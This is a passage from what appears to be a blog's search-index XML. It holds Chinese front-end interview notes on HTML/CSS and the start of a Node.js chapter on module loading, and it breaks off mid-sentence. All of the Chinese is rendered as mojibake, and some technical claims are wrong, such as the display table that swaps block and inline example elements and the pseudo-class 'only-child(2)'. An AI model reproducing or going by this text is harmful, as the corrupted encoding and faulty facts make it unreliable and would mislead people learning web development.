‡å‡†ä»¥åŠ W3C çš„ç†è§£å’Œè®¤è¯†æ ‡ç­¾é—­åˆã€æ ‡ç­¾å°å†™ã€ä¸ä¹±åµŒå¥—ã€æé«˜æœç´¢æœºå™¨äººæœç´¢å‡ çŽ‡ã€ä½¿ç”¨å¤–é“¾css å’Œ jsè„šæœ¬ã€ç»“æž„åŒ–è¡Œä¸ºè¡¨çŽ°çš„åˆ†ç¦»ã€æ–‡ä»¶ä¸‹è½½ä¸Žé¡µé¢é€Ÿåº¦æ›´å¿«ã€å†…å®¹èƒ½è¢«æ›´å¤šçš„ç”¨æˆ·æ‰€è®¿é—®ã€å†…å®¹èƒ½è¢«æ›´å¹¿å‘çš„è®¾å¤‡æ‰€è®¿é—®ã€æ›´å°‘çš„ä»£ç å’Œç»„ä»¶ï¼Œå®¹æ˜“ç»´æŠ¤ï¼Œæ”¹ç‰ˆæ–¹ä¾¿ï¼Œä¸éœ€è¦å˜åŠ¨é¡µé¢å†…å®¹ã€æä¾›æ‰“å°ç‰ˆæœ¬è€Œä¸éœ€è¦å¤åˆ¶å†…å®¹ã€æä¾›ç½‘ç«™æ˜“ç”¨æ€§ã€‚ è¡Œå†…å…ƒç´ æœ‰å“ªäº›ï¼Ÿå—çº§å…ƒç´ æœ‰å“ªäº›ï¼ŸCSS çš„ç›’æ¨¡åž‹ï¼Ÿç©ºå…ƒç´ ï¼Ÿå—çº§å…ƒç´ ï¼šdiv p h1-4 form ul ol li dl dt è¡Œå†…å…ƒç´ ï¼ša b br i span input select strong img CSS ç›’æ¨¡åž‹ï¼šborder+margin+padding+content] ç©ºå…ƒç´ ï¼š&lt;br&gt;ã€&lt;hr&gt;ã€&lt;img&gt;ã€&lt;link&gt;ã€&lt;meta&gt;ã€&lt;area&gt;ã€baseã€&lt;col&gt;ã€&lt;command&gt;ã€&lt;embed&gt;ã€&lt;keygen&gt;ã€&lt;param&gt;ã€&lt;source1&gt;ã€&lt;track&gt;ã€&lt;wbr&gt; å‰ç«¯é¡µé¢æœ‰é‚£ä¸‰å±‚æž„æˆï¼Œåˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿç»“æž„å±‚ HTML è¡¨ç¤ºå±‚ CSS è¡Œä¸ºå±‚ JS Doctype ä½œç”¨ï¼Ÿä¸¥æ ¼æ¨¡å¼å’Œæ··æ‚æ¨¡å¼å¦‚ä½•å¤„ç½šè¿™ä¸¤ç§æ¨¡å¼ï¼ŒåŒºåˆ†å®ƒä»¬æœ‰ä½•æ„ä¹‰ï¼Ÿ &lt;!DOCTYPE&gt; å£°æ˜Žä½äºŽæ–‡æ¡£ä¸­çš„æœ€å‰é¢ï¼Œå¤„äºŽ &lt;html&gt; æ ‡ç­¾ä¹‹å‰ï¼Œå‘ŠçŸ¥æµè§ˆå™¨çš„è§£æžå™¨ï¼Œç”¨ä»€ä¹ˆæ–‡æ¡£ç±»åž‹è§„èŒƒæ¥è§£æžè¿™ä¸ªæ–‡æ¡£ã€‚ ä¸¥æ ¼æ¨¡å¼çš„æŽ’ç‰ˆå’Œ JS è¿è¡Œæ¨¡å¼æ˜¯ä»¥è¯¥æµè§ˆå™¨æ”¯æŒçš„æœ€é«˜æ ‡å‡†è¿è¡Œ æ··æ‚æ¨¡å¼ä¸­ï¼Œé¡µé¢ä»¥å®½æ¾çš„å‘åŽå…¼å®¹çš„æ–¹å¼æ˜¾ç¤ºï¼Œæ¨¡æ‹Ÿè€å¼æµè§ˆå™¨çš„è¡Œä¸ºä»¥é˜²æ­¢ç«™ç‚¹æ— æ³•å·¥ä½œã€‚ DOCTYPE ä¸å­˜åœ¨æˆ–æ ¼å¼ä¸æ­£ç¡®å¯¼è‡´æ–‡æ¡£ä»¥æ··æ‚æ¨¡å¼å‘ˆçŽ°ã€‚ CSS é€‰æ‹©ç¬¦æœ‰å“ªäº›ï¼Ÿå“ªäº›å±žæ€§å¯ä»¥ç»§æ‰¿ï¼Ÿä¼˜å…ˆçº§ç®—æ³•å¦‚ä½•è®¡ç®—ï¼ŸCSS3 æ–°å¢žä¼ªç±»æœ‰å“ªäº›ï¼Ÿé€‰æ‹©ç¬¦ï¼šid é€‰æ‹©å™¨ï¼ˆ#idï¼‰ ç±»é€‰æ‹©å™¨ï¼ˆ.classï¼‰ æ ‡ç­¾é€‰æ‹©å™¨ï¼ˆdiv,h1,pï¼‰ ç›¸é‚»é€‰æ‹©å™¨ï¼ˆh1+pï¼‰ åŽä»£é€‰æ‹©å™¨ï¼ˆli aï¼‰ é€šé…ç¬¦é€‰æ‹©å™¨ï¼ˆ*ï¼‰ å±žæ€§é€‰æ‹©å™¨ï¼ˆa[rel = â€œexternalâ€]ï¼‰ ä¼ªç±»é€‰æ‹©å™¨ï¼ˆa:hover,li:nth-childï¼‰ å¯ä»¥ç»§æ‰¿çš„å±žæ€§font-size,font-family color ul li dl dd dt ä¸å¯ä»¥ç»§æ‰¿çš„å±žæ€§border padding margin width height ä¼˜å…ˆçº§å°±è¿‘åŽŸåˆ™ï¼Œæ ·å¼å®šä¹‰æœ€è¿‘è€…ä¸ºå‡†ï¼Œè½½å…¥æ ·å¼ä»¥æœ€åŽè½½å…¥çš„å®šä½ä¸ºå‡† ä¼˜å…ˆçº§!important &gt; id &gt; class &gt; tag important æ¯” å†…è”ä¼˜å…ˆçº§é«˜ CSS æ–°å¢žä¼ªç±»p: first-of-type é€‰æ‹©å±žäºŽå…¶çˆ¶å…ƒç´ çš„é¦–ä¸ª &lt;p&gt; å…ƒç´ çš„æ¯ä¸ª &lt;p&gt; å…ƒç´  p: last-of-type é€‰æ‹©å±žäºŽå…¶çˆ¶å…ƒç´ çš„æœ€åŽ &lt;p&gt; å…ƒç´ çš„æ¯ä¸ª &lt;p&gt; å…ƒç´  p: only-of-type é€‰æ‹©å±žäºŽå…¶çˆ¶å…ƒç´ å”¯ä¸€çš„ &lt;p&gt; å…ƒç´ çš„æ¯ä¸ª &lt;p&gt; å…ƒç´  p: only-child é€‰æ‹©å±žäºŽå…¶çˆ¶å…ƒç´ çš„å”¯ä¸€å­å…ƒç´ çš„æ¯ä¸ª &lt;p&gt; å…ƒç´  p: only-child(2) é€‰æ‹©å±žäºŽå…¶çˆ¶å…ƒç´ çš„ç¬¬äºŒä¸ª å­å…ƒç´ çš„æ¯ä¸ª &lt;p&gt; å…ƒç´  :enable ã€ ï¼šdisable æŽ§åˆ¶è¡¨å•æŽ§ä»¶çš„ç¦ç”¨çŠ¶æ€ :checked å•é€‰æ¡†æˆ–å¤é€‰æ¡†è¢«é€‰ä¸­ ç»å¸¸é‡åˆ°çš„æµè§ˆå™¨å…¼å®¹æ€§æœ‰å“ªäº›ï¼ŒåŽŸå› ï¼Œè§£å†³æ–¹æ³•ï¼Œå¸¸ç”¨çš„ hack æŠ€å·§png24 çš„å›¾ç‰‡åœ¨ IE6 æµè§ˆå™¨ä¸Šå‡ºçŽ°èƒŒæ™¯ï¼Œè§£å†³æ–¹æ¡ˆæ˜¯åšæˆ PNG8 æµè§ˆå™¨é»˜è®¤çš„ margin å’Œ padding ä¸åŒï¼Œè§£å†³æ–¹æ¡ˆæ˜¯åŠ ä¸€ä¸ªå…¨å±€çš„ *{margin:0,padding:0;}æ¥ç»Ÿä¸€ IE6 åŒè¾¹è·bug: å¿«å±žæ€§æ ‡ç­¾ float åŽï¼Œåˆæœ‰æ¨ªè¡Œçš„ margin çš„æƒ…å†µä¸‹ï¼Œåœ¨ ie6 æ˜¾ç¤ºçš„ margin æ¯”è®¾ç½®çš„å¤§ã€‚ æµ®åŠ¨ ie äº§ç”Ÿçš„åŒå€è·ç¦» #box{ float:left, width:10px; margin: 0 0 0 100px } åœ¨è¿™ç§æƒ…å†µä¹‹ä¸‹ IE ä¼šäº§ç”Ÿ 20px çš„è·ç¦»ï¼Œè§£å†³æ–¹æ¡ˆæ˜¯åœ¨ float çš„æ ‡ç­¾æ ·å¼æŽ§åˆ¶åŠ å…¥ _display:inline å°†å…¶è½¬åŒ–ä¸ºè¡Œå†…å±žæ€§ï¼ˆ_è¿™ä¸ªç¬¦å·åªæœ‰ ie6 ä¼šè¯†åˆ«ï¼‰ æ¸è¿›è¯†åˆ«çš„æ–¹å¼ï¼Œä»Žæ€»ä½“ä¸­é€æ¸æŽ’é™¤å±€éƒ¨ã€‚ é¦–å…ˆï¼Œå·§å¦™çš„ä½¿ç”¨ \9è¿™ä¸€æ ‡è®°ï¼Œå°†IE æµè§ˆå™¨ä»Žæ‰€æœ‰æƒ…å†µä¸­åˆ†ç¦»å‡ºæ¥ã€‚ æŽ¥ç€ å†æ¬¡ä½¿ç”¨ + å°† IE8 å’Œ IE7/6 åˆ†ç¦»å‡ºæ¥ã€‚ 123456.bb&#123; background-color:#452142;/* æ‰€æœ‰è¯†åˆ« */ .background-color:#452143\9;/* IE6/7/8 è¯†åˆ« */ +background-color:#452144;/* IE6/7 è¯†åˆ« */ _background-color:#452145;/* IE6 è¯†åˆ« */&#125; IE ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨èŽ·å–å¸¸è§„å±žæ€§çš„æ–¹æ³•æ¥èŽ·å–è‡ªå®šä¹‰å±žæ€§ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ getAttribute() èŽ·å–è‡ªå®šä¹‰å±žæ€§ Firefox ä¸‹ï¼Œåªèƒ½ä½¿ç”¨ getAttribute()èŽ·å–è‡ªå®šä¹‰å±žæ€§ è§£å†³æ–¹æ³•ï¼šç»Ÿä¸€é€šè¿‡ getAttribute() èŽ·å–è‡ªå®šä¹‰å±žæ€§ IE ä¸‹ï¼Œ event å¯¹è±¡æœ‰ x,yå±žæ€§ï¼Œä½†æ˜¯æ²¡æœ‰ pageXï¼ŒpageY å±žæ€§ï¼› Firefox ä¸‹ï¼Œevent å¯¹è±¡æœ‰ pageXï¼ŒpageY å±žæ€§ï¼Œä½†æ˜¯æ²¡æœ‰x,yå±žæ€§ ï¼ˆæ¡ä»¶æ³¨é‡Šï¼‰ç¼ºç‚¹æ˜¯åœ¨ IE æµè§ˆå™¨ä¸‹å¯èƒ½ä¼šå¢žåŠ é¢å¤–çš„ HTTP è¯·æ±‚æ•° Chrome ä¸­æ–‡ç•Œé¢ä¸‹é»˜è®¤ä¼šå°†å°äºŽ 12px çš„æ–‡æœ¬å¼ºåˆ¶æŒ‰ç…§ 12px æ˜¾ç¤ºï¼Œå¯é€šè¿‡åŠ å…¥ CSS å±žæ€§ -webkit-text-size-adjust:noneï¼› è§£å†³ åˆ—å‡º display çš„å€¼ï¼Œè¯´æ˜Žå®ƒä»¬çš„ä½œç”¨ï¼Œposition çš„å€¼ï¼Œrelative å’Œ absolute åŽŸç‚¹æ˜¯ï¼Ÿ display çš„å€¼ æè¿° å¸¸è§ä»£è¡¨ none æ­¤å…ƒç´ ä¸ä¼šæ˜¾ç¤º æ—  block æ­¤å…ƒç´ å°†ä¼šæ˜¾ç¤ºä¸ºå—çº§å…ƒç´ ï¼Œæ­¤å…ƒç´ å‰åŽå¸¦æœ‰æ¢è¡Œç¬¦ &lt;a&gt;ã€&lt;span&gt;ã€&lt;br/&gt;ã€&lt;i&gt;ã€&lt;em&gt;ã€&lt;strong&gt; inline é»˜è®¤ã€‚æ­¤å…ƒç´ ä¼šè¢«æ˜¾ç¤ºä¸ºå†…è”å…ƒç´ ï¼Œå…ƒç´ å‰åŽæ²¡æœ‰æ¢è¡Œç¬¦ &lt;div&gt;ã€&lt;p&gt;ã€&lt;h1&gt;â€¦&lt;h6&gt;ã€&lt;ol&gt;ã€&lt;ul&gt;ã€&lt;dl&gt; inline-block è¡Œå†…å—å…ƒç´ ï¼Œå³æ˜¯å†…è”å…ƒç´ ï¼Œåˆå¯ä»¥è®¾ç½®å®½é«˜ä»¥åŠè¡Œé«˜ï¼Œåº•è¾¹è· &lt;img&gt;ã€&lt;input&gt; positionçš„å€¼ å®šä½ ç‰¹ç‚¹ static é»˜è®¤å€¼ å…ƒç´ å‡ºçŽ°åœ¨æ­£å¸¸çš„æ–‡æ¡£æµä¸­ï¼Œä¸ä¼šå—leftã€topã€rightã€bottomçš„å½±å“ relative ç›¸å¯¹å®šä½ï¼Œç›¸å¯¹è‡ªèº«ä½ç½®å®šä½ å¯é€šè¿‡è®¾ç½®leftã€topã€rightã€bottomçš„å€¼æ¥è®¾ç½®ä½ç½®ï¼Œå¹¶ä¸”å®ƒåŽŸæœ¬æ‰€å çš„ç©ºé—´ä¸å˜ï¼Œå³ä¸ä¼šå½±å“å…¶ä»–å…ƒç´ å¸ƒå±€ï¼Œç»å¸¸è¢«ç”¨æ¥ä½œç»å¯¹å…ƒç´ çš„å®¹å™¨å— absolute ç»å¯¹å®šä½ï¼Œç›¸å¯¹äºŽæœ€è¿‘çš„é™¤staticå®šä½ä»¥å¤–çš„å…ƒç´ å®šä½ï¼Œè‹¥æ²¡æœ‰ï¼Œåˆ™ç›¸å¯¹äºŽhtmlå®šä½ è„±ç¦»äº†æ–‡æ¡£æµï¼Œä¸å æ®æ–‡æ¡£ç©ºé—´ï¼Œè‹¥è®¾ç½®absoluteï¼Œä½†æ²¡æœ‰è®¾ç½®topã€leftç­‰å€¼ï¼Œå…¶ä½ç½®ä¸å˜ï¼›è‹¥è®¾ç½®absoluteï¼Œä¼šå½±å“æœªå®šä¹‰å®½åº¦çš„å—çº§å…ƒç´ ï¼Œä½¿å…¶å˜ä¸ºåŒ…è£¹å…ƒç´ å†…å®¹çš„å®½åº¦ã€‚ fixed å›ºå®šå®šä½ ç›¸å¯¹äºŽæµè§ˆå™¨çª—å£å®šä½ è„±ç¦»æ–‡æ¡£æµï¼Œä¸ä¼šéšé¡µé¢æ»šåŠ¨è€Œå˜åŒ– position è·Ÿ display ã€margin collapseã€overflowã€float è¿™äº›ç‰¹å¾ç›¸äº’å åŠ åŽä¼šæ€Žä¹ˆæ ·ï¼Ÿhttps://www.cnblogs.com/jackyWHJ/p/3756087.html CSS çš„åŸºæœ¬è¯­å¥æž„æˆæ˜¯ï¼Ÿé€‰æ‹©å™¨{å±žæ€§1ï¼šå€¼1ï¼›å±žæ€§2ï¼šå€¼2ï¼Œâ€¦â€¦} CSS ä¸­å¯ä»¥é€šè¿‡å“ªäº›å±žæ€§å®šä¹‰ï¼Œä½¿å¾—ä¸€ä¸ª DOM å…ƒç´ ä¸æ˜¾ç¤ºåœ¨æµè§ˆå™¨å¯è§†èŒƒå›´å†…ï¼Ÿæœ€åŸºæœ¬çš„ï¼šè®¾ç½® display çš„å±žæ€§ä¸º none,æˆ–è€…è®¾ç½® visibility å±žæ€§ä¸º hidden æŠ€å·§æ€§ï¼š è®¾ç½®å®½é«˜ä¸º0ï¼Œè®¾ç½®é€æ˜Žåº¦ä¸º0ï¼Œè®¾ç½® z-index ä½ç½®åœ¨ -1000 ä»€ä¹ˆæ˜¯å¤–è¾¹è·é‡å ï¼Ÿé‡å çš„ç»“æžœæ˜¯ä»€ä¹ˆï¼Ÿå¤–è¾¹è·é‡å å°±æ˜¯ margin-collapse åœ¨ CSS å½“ä¸­ï¼Œç›¸é‚»çš„ä¸¤ä¸ªç›’å­ï¼ˆå¯èƒ½æ˜¯å°å¼Ÿå…³ç³»ä¹Ÿå¯èƒ½æ˜¯ç¥–å…ˆå…³ç³»ï¼‰çš„å¤–è¾¹è·å¯ä»¥ç»“åˆæˆä¸€ä¸ªå•ç‹¬çš„å¤–è¾¹è·ï¼Œè¿™ç§åˆå¹¶å¤–è¾¹è·çš„æ–¹å¼è¢«ç§°ä¸ºæŠ˜å ï¼Œå¹¶ä¸”å› è€Œæ‰€ç»“åˆæˆçš„å¤–è¾¹è·è¢«ç§°ä¸ºæŠ˜å å¤–è¾¹è·ã€‚ æŠ˜å ç»“æžœéµå¾ªä¸‹åˆ—çš„è®¡ç®—è§„åˆ™ï¼š ä¸¤ä¸ªç›¸é‚»çš„å¤–è¾¹è·éƒ½æ˜¯æ­£æ•°æ—¶ï¼ŒæŠ˜å ç»“æžœæ˜¯å®ƒä»¬ä¸¤è€…ä¹‹é—´çš„è¾ƒå¤§çš„æ•° ä¸¤ä¸ªç›¸é‚»çš„å¤–è¾¹è·éƒ½æ˜¯è´Ÿæ•°æ—¶ï¼ŒæŠ˜å ç»“æžœæ˜¯ä¸¤è€…ç»å¯¹å€¼è¾ƒå¤§çš„å€¼ ä¸¤ä¸ªå¤–è¾¹è·ä¸€æ­£ä¸€è´Ÿï¼ŒæŠ˜å ç»“æžœæ˜¯ä¸¤è€…ç›¸åŠ çš„å’Œã€‚ b æ ‡ç­¾å’Œ strong æ ‡ç­¾ï¼Œ i æ ‡ç­¾å’Œ em æ ‡ç­¾çš„åŒºåˆ«ï¼ŸåŽè€…æœ‰è¯­ä¹‰ï¼Œå‰è€…åˆ™æ— ã€‚ å‚è€ƒé“¾æŽ¥ï¼š æ€ªå¼‚æ¨¡å¼ï¼ˆQuirks Modeï¼‰å¯¹ HTML é¡µé¢çš„å½±å“ quirksæ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿå®ƒå’Œstandardsæ¨¡å¼æœ‰ä»€ä¹ˆåŒºåˆ« ç™¾åº¦ç™¾ç§‘_webpæ ¼å¼ ä»€ä¹ˆæ˜¯å¾®æ ¼å¼ï¼Ÿåœ¨å‰ç«¯æž„å»ºä¸­åº”è¯¥è€ƒè™‘å¾®æ ¼å¼å—ï¼Ÿ displayå’Œpositionçš„å€¼ä¸Žä½œç”¨]]></content>
      <categories>
        <category>å‰ç«¯é¢è¯•</category>
      </categories>
      <tags>
        <tag>å‰ç«¯é¢è¯•é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¥½çŽ©çš„Nodejs â€”â€” Node.jsè¿›é˜¶è¯é¢˜]]></title>
    <url>%2F2018-10-13-NodeJs-Part6.html</url>
    <content type="text"><![CDATA[Node.jsè¿›é˜¶è¯é¢˜è¿™æœ¬ä¹¦çš„æœ€åŽä¸€ç« ï¼Œä¸»è¦è®²è§£çš„å†…å®¹ä¸ºä»¥ä¸‹å‡ ç‚¹ æ¨¡å—åŠ è½½æœºåˆ¶ å¼‚æ­¥ç¼–ç¨‹æ¨¡å¼ä¸‹çš„æŽ§åˆ¶æµ Node.js åº”ç”¨éƒ¨ç½² Node.js çš„ä¸€äº›åŠ£åŠ¿ æ¨¡å—åŠ è½½æœºåˆ¶æ¨¡å—çš„ç±»åž‹Node.js çš„æ¨¡å—å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»ï¼Œä¸€ç±»æ˜¯æ ¸å¿ƒæ¨¡å—ï¼Œå¦ä¸€ç±»æ˜¯æ–‡ä»¶æ¨¡å—ã€‚æ ¸å¿ƒæ¨¡å—å°±æ˜¯ Node.js æ ‡å‡† API ä¸­æä¾›çš„æ¨¡å—ï¼Œå¦‚ fsã€httpã€netã€vmç­‰ï¼Œè¿™äº›éƒ½æ˜¯ Node.js å®˜æ–¹æä¾›çš„æ¨¡å—ï¼Œç¼–è¯‘æˆäº†äºŒè¿›åˆ¶ä»£ç ã€‚æˆ‘ä»¬å¯ä»¥ç›´æŽ¥é€šè¿‡ require èŽ·å–æ ¸å¿ƒæ¨¡å—ã€‚æ ¸å¿ƒæ¨¡å—æ‹¥æœ‰æœ€é«˜çš„åŠ è½½ä¼˜å…ˆçº§ï¼Œå¦‚æžœæœ‰æ¨¡å—ä¸Žå…¶å‘½åå†²çªï¼ŒNode.js æ€»æ˜¯ä¼šå…ˆåŠ è½½æ ¸å¿ƒæ¨¡å—ã€‚ æ–‡ä»¶æ¨¡å—åˆ™æ˜¯å­˜å‚¨ä¸ºå•ç‹¬çš„æ–‡ä»¶ï¼ˆæˆ–æ–‡ä»¶å¤¹ï¼‰çš„æ¨¡å—ï¼Œå¯èƒ½æ˜¯ JavaScript ä»£ç ã€JSON æˆ–ç¼–è¯‘å¥½çš„ C/C++ ä»£ç ã€‚æ–‡ä»¶æ¨¡å—çš„åŠ è½½æ–¹æ³•ç›¸å¯¹å¤æ‚ï¼Œä½†ååˆ†çµæ´»ï¼Œå°¤å…¶æ˜¯å’Œ npm ç»“åˆä½¿ç”¨æ—¶ï¼Œåœ¨ä¸æ˜¾å¼æŒ‡å®šæ–‡ä»¶æ¨¡å—æ‰©å±•åçš„æ—¶å€™ï¼ŒNode.js ä¼šåˆ†åˆ«è¯•å›¾åŠ ä¸Š .jsã€.json å’Œ .node æ‰©å±•åã€‚.js æ˜¯ JavaScript ä»£ç ï¼Œ.json æ˜¯ JSON æ ¼å¼çš„æ–‡æœ¬ï¼Œ.node æ˜¯ç¼–è¯‘å¥½çš„ C/C++ ä»£ç ã€‚ ä¸‹è¡¨æ€»ç»“äº† Node.js æ¨¡å—çš„ç±»åž‹ï¼Œä»Žä¸Šåˆ°ä¸‹åŠ è½½ä¼˜å…ˆçº§ç”±é«˜åˆ°ä½Žã€‚ æ ¸å¿ƒæ¨¡å— å†…å»º æ–‡ä»¶ JavaScript .js JSON .json C/C++ æ‰©å±• .node æŒ‰è·¯å¾„åŠ è½½æ¨¡å—æ–‡ä»¶æ¨¡å—çš„åŠ è½½æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯æŒ‰è·¯å¾„åŠ è½½ï¼Œä¸€ç§æ˜¯æŸ¥æ‰¾ node_modules æ–‡ä»¶å¤¹ã€‚å¦‚æžœ require å‚æ•°ä»¥ â€œ/â€ å¼€å¤´ï¼Œé‚£ä¹ˆå°±ç»å¯¹è·¯å¾„çš„æ–¹å¼æŸ¥æ‰¾è·¯å¾„æ¨¡å—åç§°ã€‚å¦‚æžœ require (â€˜/home/lbh/moduleâ€™) å°†ä¼šæŒ‰ç…§ä¼˜å…ˆçº§ä¾æ¬¡å°è¯•åŠ è½½ /home/lbh/module.jsã€/home/lbh/module.json å’Œ /home/lbh/module.nodeã€‚ å¦‚æžœ require å‚æ•°ä»¥â€œ ./ â€æˆ–â€œ ../ â€å¼€å¤´ï¼Œé‚£ä¹ˆåˆ™ä»¥ç›¸å¯¹è·¯å¾„çš„æ–¹å¼æ¥æŸ¥æ‰¾æ¨¡å—ï¼Œè¿™ç§æ–¹å¼åœ¨åº”ç”¨ä¸­æ˜¯æœ€å¸¸è§çš„ã€‚ä¾‹å¦‚å‰é¢çš„ä¾‹å­ä¸­æˆ‘ä»¬ç”¨äº† require(â€˜./helloâ€™) æ¥åŠ è½½åŒä¸€æ–‡ä»¶å¤¹ä¸‹çš„hello.jsã€‚ é€šè¿‡æŸ¥æ‰¾ node_modules ç›®å½•åŠ è½½æ¨¡å—å¦‚æžœ require å‚æ•°ä¸ä»¥â€œ / â€ã€â€œ ./ â€æˆ–â€œ ../ â€å¼€å¤´ï¼Œè€Œè¯¥æ¨¡å—åˆä¸æ˜¯æ ¸å¿ƒæ¨¡å—ï¼Œé‚£ä¹ˆå°±è¦é€šè¿‡æŸ¥æ‰¾ node_modules åŠ è½½æ¨¡å—äº†ã€‚æˆ‘ä»¬ä½¿ç”¨npmèŽ·å–çš„åŒ…é€šå¸¸å°±æ˜¯ä»¥è¿™ç§æ–¹å¼åŠ è½½çš„ã€‚ åœ¨æŸä¸ªç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤ npm install expressï¼Œ ä½ ä¼šå‘çŽ°å‡ºçŽ°äº†ä¸€ä¸ªå«åšnode_modulesçš„ç›®å½• åœ¨ node_modules ç›®å½•çš„å¤–é¢ä¸€å±‚ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æŽ¥ä½¿ç”¨ require(â€˜expressâ€™) æ¥ä»£æ›¿require(â€˜./node_modules/expressâ€™) ã€‚è¿™æ˜¯Node.jsæ¨¡å—åŠ è½½çš„ä¸€ä¸ªé‡è¦ç‰¹æ€§ï¼šé€šè¿‡æŸ¥æ‰¾ node_modules ç›®å½•æ¥åŠ è½½æ¨¡å—ã€‚ å½“ require é‡åˆ°ä¸€ä¸ªæ—¢ä¸æ˜¯æ ¸å¿ƒæ¨¡å—ï¼Œåˆä¸æ˜¯ä»¥è·¯å¾„å½¢å¼è¡¨ç¤ºçš„æ¨¡å—åç§°æ—¶ï¼Œä¼šè¯•å›¾åœ¨å½“å‰ç›®å½•ä¸‹çš„ node_modules ç›®å½•ä¸­æ¥æŸ¥æ‰¾æ˜¯ä¸æ˜¯æœ‰è¿™æ ·ä¸€ä¸ªæ¨¡å—ã€‚å¦‚æžœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ä¼šåœ¨å½“å‰ç›®å½•çš„ä¸Šä¸€å±‚ä¸­çš„ node_modules ç›®å½•ä¸­ç»§ç»­æŸ¥æ‰¾ï¼Œåå¤æ‰§è¡Œè¿™ä¸€è¿‡ç¨‹ï¼Œç›´åˆ°é‡åˆ°æ ¹ç›®å½•ä¸ºæ­¢. ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬è¦åœ¨ /home/lbh/develop/foo.js ä¸­ä½¿ç”¨ require(â€˜bar.jsâ€™) å‘½ä»¤ï¼ŒNode.jsä¼šä¾æ¬¡æŸ¥æ‰¾ï¼š /home/lbh/develop/node_modules/bar.js /home/lbh/node_modules/bar.js /home/node_modules/bar.js /node_modules/bar.js ä¸ºä»€ä¹ˆè¦è¿™æ ·åšå‘¢ï¼Ÿå› ä¸ºé€šå¸¸ä¸€ä¸ªå·¥ç¨‹å†…ä¼šæœ‰ä¸€äº›å­ç›®å½•ï¼Œå½“å­ç›®å½•å†…çš„æ–‡ä»¶éœ€è¦è®¿é—®åˆ°å·¥ç¨‹å…±åŒä¾èµ–çš„æ¨¡å—æ—¶ï¼Œå°±éœ€è¦å‘çˆ¶ç›®å½•ä¸Šæº¯äº† æ¯”å¦‚è¯´å·¥ç¨‹çš„ç›®å½•ç»“æž„å¦‚ä¸‹ï¼š 123456789101112|- project |- app.js |- models |- ... |- views |- ... |- controllers |- index_controller.js |- error_controller.js |- ... |- node_modules |- express æˆ‘ä»¬ä¸ä»…è¦åœ¨ project ç›®å½•ä¸‹çš„ app.js ä¸­ä½¿ç”¨ require(â€˜expressâ€™) ï¼Œè€Œä¸”å¯èƒ½è¦åœ¨controllers å­ç›®å½•ä¸‹çš„ index_controller.js ä¸­ä¹Ÿä½¿ç”¨ require åŠ è½½ç¼“å­˜Node.js æ¨¡å—ä¸ä¼šè¢«é‡å¤åŠ è½½ï¼Œè¿™æ˜¯å› ä¸º Node.js é€šè¿‡æ–‡ä»¶åç¼“å­˜æ‰€æœ‰åŠ è½½è¿‡çš„æ–‡ä»¶æ¨¡å—ï¼Œæ‰€ä»¥ä»¥åŽå†è®¿é—®åˆ°æ—¶å°±ä¸ä¼šé‡æ–°åŠ è½½äº†ã€‚æ³¨æ„ï¼ŒNode.js æ˜¯æ ¹æ®å®žé™…æ–‡ä»¶åç¼“å­˜çš„ï¼Œè€Œä¸æ˜¯ require() æä¾›çš„å‚æ•°ç¼“å­˜çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å³ä½¿ä½ åˆ†åˆ«é€šè¿‡require(â€˜expressâ€™) å’Œ require(â€˜./node_modules/expressâ€™) åŠ è½½ä¸¤æ¬¡ï¼Œä¹Ÿä¸ä¼šé‡å¤åŠ è½½ï¼Œå› ä¸ºå°½ç®¡ä¸¤æ¬¡å‚æ•°ä¸åŒï¼Œè§£æžåˆ°çš„æ–‡ä»¶å´æ˜¯åŒä¸€ä¸ªã€‚ åŠ è½½é¡ºåºæ€»ç»“ä¸€ä¸‹ä½¿ç”¨ require(some_module) æ—¶çš„åŠ è½½é¡ºåºã€‚ (1) å¦‚æžœ some_module æ˜¯ä¸€ä¸ªæ ¸å¿ƒæ¨¡å—ï¼Œç›´æŽ¥åŠ è½½ï¼Œç»“æŸã€‚(2) å¦‚æžœ some_module ä»¥â€œ / â€ã€â€œ ./ â€æˆ–â€œ ../ â€å¼€å¤´ï¼ŒæŒ‰è·¯å¾„åŠ è½½ some_module ï¼Œç»“æŸã€‚(3) å‡è®¾å½“å‰ç›®å½•ä¸º current_dirï¼ŒæŒ‰è·¯å¾„åŠ è½½ current_dir/node_modules/some_moduleã€‚ å¦‚æžœåŠ è½½æˆåŠŸï¼Œç»“æŸã€‚ å¦‚æžœåŠ è½½å¤±è´¥ï¼Œä»¤current_dirä¸ºå…¶çˆ¶ç›®å½•ã€‚ é‡å¤è¿™ä¸€è¿‡ç¨‹ï¼Œç›´åˆ°é‡åˆ°æ ¹ç›®å½•ï¼ŒæŠ›å‡ºå¼‚å¸¸ï¼Œç»“æŸã€‚ æŽ§åˆ¶æµåŸºäºŽå¼‚æ­¥ I/O çš„äº‹ä»¶å¼ç¼–ç¨‹å®¹æ˜“å°†ç¨‹åºçš„é€»è¾‘æ‹†å¾—ä¸ƒé›¶å…«è½ï¼Œç»™æŽ§åˆ¶æµçš„ç–ç†åˆ¶é€ éšœç¢ã€‚è®©æˆ‘ä»¬é€šè¿‡ä¸‹é¢çš„ä¾‹å­æ¥è¯´æ˜Žè¿™ä¸ªé—®é¢˜ã€‚ å¾ªçŽ¯çš„é™·é˜±Node.js çš„å¼‚æ­¥æœºåˆ¶ç”±äº‹ä»¶å’Œå›žè°ƒå‡½æ•°å®žçŽ°ï¼Œä¸€å¼€å§‹æŽ¥è§¦å¯èƒ½ä¼šæ„Ÿè§‰è¿åå¸¸è§„ï¼Œä½†ä¹ 